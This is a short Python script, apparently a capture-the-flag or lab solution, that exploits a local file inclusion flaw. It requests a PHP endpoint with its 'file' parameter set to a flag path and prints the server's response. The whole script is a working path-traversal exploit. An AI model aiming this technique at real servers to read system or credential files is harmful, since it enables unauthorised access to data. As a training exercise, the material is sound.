import requests

BASE_URL = "http://www.edu.stf/api/read.php"
PAYLOAD = "/etc/pt.flag"

def solve_lfi():
    params = {
        "file": PAYLOAD
    }
    
    try:
        response = requests.get(BASE_URL, params=params, timeout=10)
        
        print(response.text)
            
    except requests.exceptions.RequestException as e:
        print(f"Ошибка: {e}")

if __name__ == "__main__":
    solve_lfi()
